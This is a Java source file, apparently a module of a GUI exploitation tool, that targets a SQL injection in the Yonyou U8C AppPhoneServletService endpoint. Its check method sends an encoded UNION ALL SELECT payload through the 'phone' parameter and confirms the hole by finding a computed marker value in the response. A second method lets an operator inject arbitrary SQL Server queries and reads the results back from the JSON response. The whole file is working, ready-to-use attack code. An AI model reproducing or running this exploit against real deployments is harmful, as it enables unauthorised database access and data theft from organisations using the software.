package exp.oa.yongyou.u8c;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_U8C_AppPhoneServletService_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("accountCode","U8cloud");
            String payload = "module=sm&method=getUserInfoByPhone&phone=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20EcHm";
            Response post_res = HttpTools.post(url + "/service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService",payload, head, "utf-8");
            if (post_res.getCode() == 200 && post_res.getText().contains("12321")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_U8C_AppPhoneServletService_sqli ]");
                    textArea.appendText("\n CMD处输入sql语句执行，注入类型error注入,sql:sqlserver");
                    textArea.appendText("\n eg: USER_NAME()");
                    textArea.appendText("\n");
                });

                String target_req = "POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n" +
                        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n\n"+
                        payload;
                Platform.runLater(() -> {
                    textArea_cmd.appendText(target_req);
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        HashMap<String, String> head = new HashMap<>();
        head.put("accountCode","U8cloud");
        String payload = "module=sm&method=getUserInfoByPhone&phone=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2C"+ getAllEncode.getAllUrlEncode(sql,"all")+"%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20EcHm";
        Response var =  HttpTools.post(url+"/service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService",payload,head,"utf-8");
        String var1 = var.getText();

        if(var.getCode() == 200 && var1.contains("ucode")){
            String res = JSON.parseObject(var1.replace("[","").replace("]","")).get("ucode").toString();
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText(res +"\n");
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
